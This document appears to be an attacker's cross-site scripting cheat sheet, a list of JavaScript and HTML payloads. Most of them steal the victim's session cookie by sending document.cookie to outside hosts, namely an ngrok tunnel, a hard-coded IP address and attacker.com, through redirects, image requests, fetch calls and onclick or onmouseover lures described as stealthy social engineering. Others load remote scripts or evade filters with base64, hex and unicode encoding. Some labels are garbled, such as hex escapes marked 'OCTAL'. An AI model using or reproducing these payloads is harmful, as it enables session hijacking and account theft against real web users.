```bash
document.location = 'http://4.tcp.ngrok.io:10402/steal?cookie=' + encodeURIComponent(document.cookie);

new Image().src = 'http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie);

fetch('http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie));

<a href="#" onclick="new Image().src='http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie)">Click me</a>
#When the user clicks the link, it silently sends the cookie to your server using an 
#image request.

<a href="#" onmouseover="new Image().src='http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie)">Hover here</a>
#Sends the cookie just by hovering — useful for stealthy social engineering.

<img src=0 onerror="alert('XSS')">

<img src=1 onerror=fetch('http://3.224.73.92/steal?c=' + encodeURIComponent(document.cookie));

<img src=1 onerror="import('//attacker.com/x.js')"> # Loads javascript from a remote server

"/><script>import('//localserver/xss.js')</script>

eval(atob("YWxlcnQoMSk=")) # // → runs alert(1) (BASE64)

<img src=1 onerror="eval('\x61\x6c\x65\x72\x74(1)')">

eval("\x61\x6c\x65\x72\x74(1)");  #// Hex for "alert(1)" # OCTAL

function("\x61\x6c\x65\x72\x74(1)"); OCTAL

<img src=1 onerror="var a='al',b='ert(1)';eval(a.concat(b))"> #String concatenation

<img src=1 onerror="al\u0065rt(1)"> # Unicode


